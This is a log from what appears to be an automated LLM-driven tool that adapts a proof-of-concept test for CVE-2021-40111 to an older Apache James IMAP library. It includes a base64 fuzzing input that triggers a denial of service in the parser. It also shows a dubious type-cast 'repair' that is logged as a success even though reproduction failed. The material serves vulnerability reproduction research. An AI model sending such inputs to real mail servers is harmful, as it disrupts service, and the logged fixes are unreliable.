[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2067 (prompt), 1 (completion), 2068 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,82] incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[INFO] 3 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.064 s
[INFO] Finished at: 2025-07-13T15:36:07Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,82] incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 169 (prompt), 25 (completion), 194 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest, None, None 

The test executes as expected in 3.5.0 

Error code:                         new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession())) 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.ImapCommand;org.apache.james.imap.api.message.request.ImapRequest
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.ImapCommand', 'org.apache.james.imap.api.message.request.ImapRequest'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 30, 'column': 82, 'message': 'incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest', 'symbol': None, 'location': None, 'code_line': '                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))'} with cause: ['org.apache.james.imap.api.ImapCommand', 'org.apache.james.imap.api.message.request.ImapRequest'][0m
[LLMClient] Tokens used: 211 (prompt), 25 (completion), 236 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest, None, None 

The test executes as expected in 3.5.0 

Error code:                         new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession())) 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.api.ImapCommand', 'org.apache.james.imap.api.message.request.ImapRequest'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.ImapCommand;org.apache.james.imap.api.message.request.ImapRequest
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.ImapCommand', 'org.apache.james.imap.api.message.request.ImapRequest'][0m
[96m[Adapter] Related diffs for error: [(5134, 10.0), (5137, 10.0), (5142, 10.0), (5149, 10.0), (5151, 10.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest | cause: ['org.apache.james.imap.api.ImapCommand', 'org.apache.james.imap.api.message.request.ImapRequest'][0m
[96m[RepairModule] Trying best diff #5134 with score 10.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #5137 with score 10.00[0m
[LLMClient] Tokens used: 894 (prompt), 495 (completion), 1389 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest, symble: None, location: None

### Error Position:
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/message/request/AbstractMailboxSelectionRequest.java, Hunk: @@ -19,10 +19,16 @@

 package org.apache.james.imap.message.request;

-import java.util.Objects;
-
 import org.apache.james.imap.api.ImapCommand;
-import org.apache.james.imap.api.Tag;
 import org.apache.james.imap.api.message.IdRange;
 import org.apache.james.imap.api.message.UidRange;
 import org.apache.james.imap.api.message.request.ImapRequest;
-import org.apache.james.mailbox.model.UidValidity;
-
-import com.google.common.base.Preconditions;

 /**
  * {@link ImapRequest} which selects a Mailbox.

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.message.request.ImapRequest;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, ImapRequest tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.message.request.ImapRequest;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), (ImapRequest) ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, ImapRequest tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |', 'incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest |'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[92m[RepairModule] Error incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #5137 at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1847 (prompt), 1 (completion), 1848 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.167 s
[INFO] Finished at: 2025-07-13T15:36:54Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 176 (prompt), 27 (completion), 203 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super(statusResponseFactory); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
